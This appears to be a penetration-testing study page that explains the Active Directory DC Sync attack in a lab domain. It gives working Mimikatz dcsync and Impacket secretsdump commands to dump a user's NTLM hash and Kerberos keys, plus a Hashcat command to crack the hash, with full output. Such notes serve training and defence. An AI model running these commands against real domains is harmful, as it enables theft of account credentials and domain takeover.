---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DC Sync

[Recall](../../#a-d-replication-model) that domains typically rely on more than one domain controller to provide redundancy. The **Directory Replication Service** (**DRS**) **Remote Protoco**l uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the `IDL_DRSGetNCChanges` API.

[Also recall](../../#drs-remote-protocol) that in order to request replication a user needs to have the rights:

* `Replicating Directory Changes`
* `Replicating Directory Changes All`
* `Replicating Directory Changes in Filtered Set` rights.

By default, members of the `Domain Admins`, `Enterprise Admins`, and `Administrators` groups have these rights assigned.

Should an attacker stumble across a member of one of these groups, or any other account with the requisite rights, they could perform a **Domain Controller Synchronization** (**DC Sync**) attack.

The basic premise is simple, the attacker pretends they are a domain controller requesting synchronization. The (real) domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. Through this channel the attacker can request any items in the domain.

The following examples will assume the attacker has compromised the `jeffadmin` account which is a member of `Domain Admins` and thus has the required rights.

```shell-session
C:\Users\jeffadmin>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
...
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
...
CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
```

All examples will be targeting the `corp\dave` account.

## Example

### Mimikatz

[Mimikatz](../../../tools/mimikatz.md) can be used to conduct DC Sync attacks. `dcsync` is a sub-command of the `lsadump` command. The command must be run from an elevated shell session. Once launched the Mimikatz command to perform the attack is:

```
lsadump::dcsync /user:corp\dave
```

* `/user` targets the dcsync attack at the corp\dave account

When run this reveals a trove of information including the user's NTLM hash:

```shell-session
mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d

Supplemental Credentials:
...
```

If desired the hash can be saved in a file (`hashes.dcsync`) and run through Hashcat with the command:

{% code title="hashes.dcsync" %}
```
08d7a47a6f9f66b97b1bae4178747494
```
{% endcode %}

{% code overflow="wrap" %}
```bash
sudo hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
{% endcode %}

* `-m 1000` is NTLM mode and was found by running `hashcat --help` and using `grep` to find NTLM
* `--force` should be added if running in a VM

This does succeed in cracking the hash!

### Impacket

The same technique can be used from a Linux machine using Impacket's [`secretsdump`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) script. The command structure is:

{% code overflow="wrap" %}
```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
{% endcode %}

* `-just-dc-user` specifies only querying for a specific user, `dave`
* Request is addressed as `domain/user:"password"@DC_IP`

When run this reveals the same NTLM hash as found with Mimikatz:

```shell-session
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.238.70
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up..
```

* The hash is the 4th field in the line that starts `dave:1103:...`
